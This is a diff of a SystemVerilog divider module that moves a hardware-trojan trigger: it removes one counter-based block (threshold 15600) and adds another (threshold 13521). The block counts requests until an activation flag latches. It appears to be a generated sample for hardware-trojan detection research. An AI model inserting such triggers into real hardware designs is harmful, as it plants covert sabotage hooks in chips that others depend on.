@@ -21,24 +21,6 @@ output
     DataPath quotient,
     DataPath remainder
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15600;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (req) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     // 演算幅
     // 符号なしを，符号付きに拡張するので +1 する
     // 32-bit 符号なしは，33ビット符号付きの正の値とする
@@ -53,6 +35,23 @@ output
     // オーバーフロー判定用定数
     parameter DATA_MINUS_ONE = (1 << DATA_WIDTH) - 1;
     parameter DATA_MINIMUM = (1 << (DATA_WIDTH - 1));
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13521)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 13521;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (req) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
 
     // Internal registers
